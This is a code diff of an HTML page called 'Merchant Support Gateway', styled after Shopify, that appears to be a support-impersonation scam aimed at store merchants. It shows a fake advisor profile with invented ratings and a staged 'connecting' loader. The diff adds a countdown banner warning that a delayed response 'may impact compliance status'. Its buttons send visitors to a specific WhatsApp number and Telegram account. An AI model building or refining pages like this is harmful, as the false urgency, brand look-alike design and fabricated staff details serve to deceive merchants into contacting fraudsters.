@@ -1,6 +1,6 @@
 <!doctype html>
 <html lang="en">
-<head https://cdn.shopify.com/static/shopify-favicon.png>
+<head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Merchant Support Gateway — Independent Partner</title>
@@ -12,10 +12,12 @@
     /* small custom styles */
     .fade-in { animation: fadeIn .28s ease both; }
     @keyframes fadeIn { from { opacity: 0; transform: translateY(6px) } to { opacity: 1; transform: none } }
-    .dot { width:10px;height:10px;border-radius:9999px;display:inline-block }
     .toast { position: fixed; right: 20px; bottom: 20px; z-index: 9999; }
   </style>
-</head https://cdn.shopify.com/static/shopify-favicon.png>
+
+  <!-- We'll set this href from CONFIG in JS so it's always in sync with your logo -->
+  <link id="faviconLink" rel="icon" href="">
+</head>
 <body class="bg-gray-50 text-gray-900 antialiased">
 
 <!--
@@ -23,10 +25,10 @@
   This UI is "Shopify-inspired" for familiarity but DO NOT imply official Shopify
   affiliation. The visible disclaimer is required — keep it present.
 -->
-
 <script>
   // -------------- CONFIG (edit these) ----------------
   const CONFIG = {
+    logoUrl: "https://i.pinimg.com/736x/1c/65/b3/1c65b3c672767808e39ba1669c8e1482.jpg", // ✅ your favicon used as logo
     whatsappNumber: "2349135251130",   // no plus sign, country code first
     telegramUsername: "Xcellexert",    // username only
     supportEmail: "support@example.com",
@@ -40,8 +42,8 @@
       years: "5+ years",
       merchantsHelped: 76,
       rating: 4.9,
-      // royalty-free Unsplash portrait
-      photoUrl: "https://i.pinimg.com/736x/1c/65/b3/1c65b3c672767808e39ba1669c8e1482.jpg"
+      // Swap to your staff image URL here (direct image URL). We keep a fallback if hotlinking fails.
+      photoUrl: "https://images.unsplash.com/photo-1593032457860-9e1d5bc3c7d4?q=80&w=640&auto=format&fit=crop"
     },
 
     countdownHours: 24,   // show persistent countdown (hours)
@@ -53,10 +55,8 @@
 <!-- LOADING / PROGRESS (shows until steps done) -->
 <div id="loading" class="min-h-screen flex items-center justify-center px-6">
   <div class="max-w-md w-full text-center">
-    <!-- custom support glyph -->
-    <div class="mx-auto mb-4 w-14 h-14 rounded-full bg-emerald-600 flex items-center justify-center">
-      <svg xmlns="http://www.w3.org/2000/svg" class="w-8 h-8 text-white" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2a7 7 0 0 0-7 7v2.25c0 .414-.336.75-.75.75S3 12.664 3 12.25V9a9 9 0 1 1 18 0v3.25c0 .414-.336.75-.75.75s-.75-.336-.75-.75V9a7 7 0 0 0-7-7Z"/><path d="M5.25 13.5A.75.75 0 0 0 4.5 14v2.25A5.75 5.75 0 0 0 10.25 22h3.5A5.75 5.75 0 0 0 19.5 16.25V14a.75.75 0 0 0-.75-.75h-13.5Z"/></svg>
-    </div>
+    <!-- header logo during loading -->
+    <img id="logoTopLoading" alt="Logo" class="mx-auto mb-4 w-14 h-14 rounded-full object-cover border border-emerald-200" src="" />
 
     <h2 class="text-lg font-semibold mb-3">Connecting you with a Merchant Advisor…</h2>
 
@@ -76,9 +76,8 @@
   <header class="sticky top-0 bg-white/80 backdrop-blur border-b z-30">
     <div class="max-w-6xl mx-auto px-4 py-3 flex items-center justify-between">
       <div class="flex items-center gap-3">
-        <div class="w-9 h-9 rounded-full bg-emerald-600 flex items-center justify-center text-white">
-          <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2a7 7 0 0 0-7 7v2.25c0 .414-.336.75-.75.75S3 12.664 3 12.25V9a9 9 0 1 1 18 0v3.25c0 .414-.336.75-.75.75s-.75-.336-.75-.75V9a7 7 0 0 0-7-7Z"/><path d="M5.25 13.5A.75.75 0 0 0 4.5 14v2.25A5.75 5.75 0 0 0 10.25 22h3.5A5.75 5.75 0 0 0 19.5 16.25V14a.75.75 0 0 0-.75-.75h-13.5Z"/></svg>
-        </div>
+        <!-- ✅ Real image logo from CONFIG -->
+        <img id="logoTop" alt="Logo" class="w-9 h-9 rounded-full object-cover border border-emerald-200" src="" />
         <div>
           <div class="text-sm font-semibold">Merchant Support Gateway</div>
           <div class="text-xs text-gray-500">Shopify-aligned | Independent Partner</div>
@@ -95,6 +94,15 @@
   <section class="max-w-5xl mx-auto px-4 py-10 grid gap-8 md:grid-cols-[1.2fr_0.8fr]">
     <!-- left: advisor card -->
     <div class="bg-white rounded-2xl shadow-sm p-6 md:p-8">
+      <!-- Amber countdown banner -->
+      <div class="flex items-center gap-2 rounded-xl bg-amber-50 border border-amber-200 p-3 mb-5">
+        <svg class="w-4 h-4 text-amber-600" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 6v6l4 2"/></svg>
+        <p class="text-sm text-amber-800">
+          Case Notice: delayed response may impact compliance status. Connect within
+          <span id="countdown" class="font-semibold">--:--:--</span>.
+        </p>
+      </div>
+
       <div class="flex items-start gap-6">
         <img id="advisorPhoto" src="" alt="Advisor" class="w-24 h-24 md:w-28 md:h-28 rounded-full object-cover border" />
         <div class="flex-1">
@@ -188,7 +196,7 @@
   </section>
 
   <!-- footer -->
-  <footer class="mt-10 border-t bg-white">
+  <footer class="mt-10 border-top bg-white">
     <div class="max-w-6xl mx-auto px-4 py-6 text-xs text-gray-500">
       <p>
         © <span id="year"></span> Merchant Support Gateway — Independent Partner resource.
@@ -244,9 +252,23 @@
     "Preparing secure channel"
   ];
 
-  // fill advisor data from CONFIG
+  const FALLBACK_PHOTO = "https://images.unsplash.com/photo-1593032457860-9e1d5bc3c7d4?q=80&w=640&auto=format&fit=crop";
+
+  // fill initial DOM from CONFIG
   document.addEventListener("DOMContentLoaded", () => {
-    document.getElementById('advisorPhoto').src = CONFIG.advisor.photoUrl;
+    // set favicon + logos
+    const fav = document.getElementById('faviconLink');
+    if (fav) fav.href = CONFIG.logoUrl;
+    const logoTop = document.getElementById('logoTop');
+    const logoTopLoading = document.getElementById('logoTopLoading');
+    if (logoTop) logoTop.src = CONFIG.logoUrl;
+    if (logoTopLoading) logoTopLoading.src = CONFIG.logoUrl;
+
+    // advisor info
+    const photoEl = document.getElementById('advisorPhoto');
+    photoEl.src = CONFIG.advisor.photoUrl;
+    photoEl.onerror = () => { photoEl.src = FALLBACK_PHOTO; };
+
     document.getElementById('advisorName').innerText = CONFIG.advisor.name;
     document.getElementById('advisorTitle').innerText = CONFIG.advisor.title;
     document.getElementById('staffIdSpan').innerHTML = `Advisor ID: <strong>${CONFIG.advisor.staffId}</strong>`;
@@ -263,7 +285,9 @@
     steps.forEach((s,i) => {
       const li = document.createElement('li');
       li.className = 'flex items-center gap-3';
-      li.innerHTML = `<span id="dot${i}" class="inline-flex w-5 h-5 rounded-full border border-gray-300 items-center justify-center"></span><span id="label${i}" class="text-sm text-gray-500">${s}</span>`;
+      li.innerHTML = `
+        <span id="dot${i}" class="inline-flex w-5 h-5 rounded-full border border-gray-300 items-center justify-center"></span>
+        <span id="label${i}" class="text-sm text-gray-500">${s}</span>`;
       list.appendChild(li);
     });
 
@@ -273,7 +297,7 @@
     initCountdown();
     // wire CTA buttons to open modal
     document.querySelectorAll('.contactBtn').forEach(btn => {
-      btn.addEventListener('click', (e) => {
+      btn.addEventListener('click', () => {
         const channel = btn.getAttribute('data-channel');
         openModal(channel);
       });
@@ -324,23 +348,20 @@
     }
     const startTs = Number(start);
     const total = CONFIG.countdownHours * 3600;
-    const elTimerUpdate = () => {
+    const elTimer = document.getElementById('countdown');
+
+    const tick = () => {
       const elapsed = Math.floor((Date.now() - startTs) / 1000);
       const remaining = Math.max(total - elapsed, 0);
       const h = Math.floor(remaining / 3600);
       const m = Math.floor((remaining % 3600) / 60);
       const s = remaining % 60;
-      // find amber banner time span
-      const span = document.querySelector('.bg-amber-50 p span.font-semibold');
-      if(span) span.innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
-      // also update small header timer if used
-      // update every second
-      if(remaining <= 0){
-        // optionally do something when expired
+      if(elTimer){
+        elTimer.innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
       }
     };
-    elTimerUpdate();
-    setInterval(elTimerUpdate, 1000);
+    tick();
+    setInterval(tick, 1000);
   }
 
   // modal control
@@ -353,7 +374,6 @@
   }
   function closeModal(){
     document.getElementById('modal').classList.add('hidden');
-    // clear inputs if you want or keep them
   }
 
   function showToast(){
@@ -379,10 +399,7 @@
       const url = `https://wa.me/${CONFIG.whatsappNumber}?text=${encoded}`;
       window.open(url, '_blank');
     } else if(activeChannel === 'telegram'){
-      // using direct username pattern (may open profile in some clients)
-      // fallback: share URL to Telegram if username pattern does not open the chat client
       let url = `https://t.me/${CONFIG.telegramUsername}?text=${encoded}`;
-      // open
       window.open(url, '_blank');
     } else if(activeChannel === 'email'){
       const mailto = `mailto:${CONFIG.supportEmail}?subject=${encodeURIComponent('Support Ticket ' + ticket)}&body=${encoded}`;
@@ -402,5 +419,3 @@
 
 </body>
 </html>
-
-
